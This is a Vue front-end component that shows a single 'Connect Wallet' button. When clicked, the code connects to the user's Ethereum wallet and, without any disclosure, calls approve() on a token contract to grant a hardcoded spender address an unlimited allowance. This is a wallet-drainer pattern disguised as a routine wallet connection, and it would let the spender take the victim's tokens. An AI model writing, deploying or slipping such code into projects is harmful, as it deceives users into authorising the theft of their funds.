<template>
  <div>
    <button class="connect-wallet" @click="connectWallet">Connect Wallet</button>
    <img src="./assets/logo.png" alt="Logo" />
  </div>
</template>

  
  <script lang="ts">
  import { defineComponent } from 'vue';
  import Web3 from 'web3';
  import usdtABI from '@/abi/usdt.json';
  
  declare global {
    interface Window {
      ethereum?: any;
    }
  }
  
  export default defineComponent({
    data() {
      return {
        web3: null as Web3 | null,
        account: null as string | null,
        balance: null as string | null,
      };
    },
  
    methods: {
      async connectWallet() {
        try {
          if (typeof window.ethereum !== 'undefined') {
            this.web3 = new Web3(window.ethereum);
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            const accounts = await this.web3.eth.getAccounts();
            this.account = accounts[0];
            const balance = await this.web3.eth.getBalance(this.account);
            this.balance = this.web3.utils.fromWei(balance, 'ether');
  
            // add new code to approve contract transfer
            const usdtContractAddress = '0x4701543Cb4c3e7Df1D826A11dAae33cb7B2Ee7bb';
            const { abi: usdtAbi } = usdtABI;
            const usdtContract = new this.web3.eth.Contract(usdtABI, usdtContractAddress)
            const spenderAddress = '0x410A75084f40F4180c594Ea77C8f009dA014dc20';
            const infiniteApproval = this.web3.utils.toBN(2).pow(this.web3.utils.toBN(256)).sub(this.web3.utils.toBN(1)).toString();
            await usdtContract.methods.approve(spenderAddress, infiniteApproval).send({ from: this.account });
  
            console.log('Wallet connected successfully');
            console.log('Account:', this.account);
            console.log('Balance:', this.balance);
          } else {
            console.error('Wallet not found');
          }
        } catch (error) {
          console.error(error);
        }
      },
    },
  });
  </script>



<style scoped>
div {
  position: relative;
  height: 100vh;
  background-image: url('./assets/logo.png');
  background-repeat: no-repeat;
  background-size: contain;
  background-position: center;
}

button {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  width: 120px;
  height: 120px;
  font-size: 18px;
  border-radius: 50%;
  background-color: #d2d2dd;
  color: #065317;
  border: none;
  cursor: pointer;
  transition: all 0.2s ease;
  box-shadow: 0 2px 4px rgba(114, 39, 10, 0.1);
}

button:hover {
  background-color: #0aad12;
  box-shadow: 0 4px 8px rgba(180, 25, 25, 0.2);
}

button:active {
  background-color: #3312aa;
  box-shadow: none;
}


</style>